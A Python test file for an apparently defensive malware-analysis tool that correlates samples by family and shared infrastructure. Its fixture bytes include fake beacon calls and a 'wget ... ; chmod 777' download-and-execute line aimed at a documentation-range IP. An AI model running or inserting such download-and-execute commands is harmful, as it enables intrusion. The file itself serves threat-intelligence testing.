from datetime import UTC, datetime

from loop_engineering.knowledge import (
    build_record,
    correlate,
    render_knowledge_doc,
    render_observations_markdown,
    update_knowledge,
)
from loop_engineering.sample_static_analysis import analyze_sample_bytes


def _record(data: bytes, sha_family: str, tags=None):
    meta = {
        "sha256_hash": "0" * 64,
        "file_type": "javascript",
        "first_seen": "2026-06-21 00:00:00",
        "signature": sha_family,
        "tags": tags or [],
    }
    analysis = analyze_sample_bytes(data, meta, source_name="x.js")
    return build_record(analysis, report_dir="reports/x")


def test_correlate_flags_shared_infrastructure_and_repeat_family():
    first = _record(b'beacon("http://198.51.100.5/a");', "Famous")
    knowledge = update_knowledge({"samples": []}, first)

    # Second sample reaches the same IP and is the same family.
    second = _record(b'wget http://198.51.100.5/b; chmod 777 b', "Famous")
    correlations = correlate(knowledge, second)

    assert correlations["corpus_size_before"] == 1
    assert correlations["family_seen_before"] == 1
    assert not correlations["is_new_family"]
    overlaps = {(o["type"], o["indicator"]) for o in correlations["infra_overlap"]}
    assert ("IP", "198.51.100.5") in overlaps


def test_new_family_is_marked_new():
    knowledge = update_knowledge({"samples": []}, _record(b'x=1', "AlphaRAT"))
    correlations = correlate(knowledge, _record(b'y=2', "BetaBot"))
    assert correlations["is_new_family"] is True
    assert correlations["family_seen_before"] == 0


def test_knowledge_docs_render_shared_infra():
    knowledge = {"samples": []}
    knowledge = update_knowledge(knowledge, _record(b'a("http://198.51.100.5/a");', "Famous"))
    knowledge = update_knowledge(knowledge, _record(b'b("http://198.51.100.5/b");', "Famous"))

    doc = render_knowledge_doc(knowledge)
    observations = render_observations_markdown(knowledge)

    assert "198.51.100.5" in doc
    assert "Famous" in doc
    assert "Samples analyzed: 2" in observations
